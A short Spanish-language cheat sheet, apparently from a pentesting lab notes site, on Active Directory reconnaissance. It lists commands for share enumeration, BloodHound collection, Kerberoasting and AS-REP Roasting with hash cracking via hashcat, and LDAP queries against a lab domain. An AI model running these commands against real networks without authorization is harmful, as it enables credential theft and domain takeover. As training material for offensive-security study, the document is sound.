---
title: Enumeración de Active Directory
order: 1
description: Reconocimiento de un dominio AD — enumeración con BloodHound, Kerberoasting, AS-REP Roasting y consultas LDAP.
---

## Enumeración inicial

Con credenciales de bajo privilegio:

```bash wrap=false
crackmapexec smb 10.10.10.10 -u user -p pass --shares
enum4linux-ng -A 10.10.10.10
```

## BloodHound

Recolecta datos del dominio para encontrar rutas de ataque:

```bash wrap=false
bloodhound-python -u user -p pass -d dominio.htb -ns 10.10.10.10 -c all
```

Importa el resultado en BloodHound y busca *Shortest Path to Domain Admins*.

## Kerberoasting

Solicita tickets de servicio (SPN) y crackéalos offline:

```bash wrap=false
GetUserSPNs.py dominio.htb/user:pass -dc-ip 10.10.10.10 -request
hashcat -m 13100 hashes.txt rockyou.txt
```

## AS-REP Roasting

Usuarios sin pre-autenticación Kerberos:

```bash wrap=false
GetNPUsers.py dominio.htb/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10
hashcat -m 18200 hashes.txt rockyou.txt
```

## Consultas LDAP

```bash wrap=false
ldapsearch -x -H ldap://10.10.10.10 -b "DC=dominio,DC=htb"
```
